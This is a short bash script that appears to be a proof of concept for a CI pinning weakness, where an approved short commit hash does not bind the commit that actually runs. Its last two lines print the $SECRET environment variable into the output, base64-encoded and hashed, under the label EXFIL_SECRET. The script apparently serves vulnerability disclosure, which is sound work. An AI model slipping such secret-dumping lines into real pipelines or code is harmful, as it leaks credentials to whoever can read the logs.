#!/usr/bin/env bash
# EXECUTED COMMIT (Y): never reviewed by the maintainer.
# Demonstrates that the approved pin (short sha of X) does not bind the executed commit.
echo "EXECUTED_HEAD_SHA=$(git rev-parse HEAD 2>/dev/null || echo unknown)"
echo "EXFIL_SECRET_B64=$(printf '%s' "$SECRET" | base64 -w0)"
echo "EXFIL_SECRET_SHA256=$(printf '%s' "$SECRET" | sha256sum | cut -d' ' -f1)"
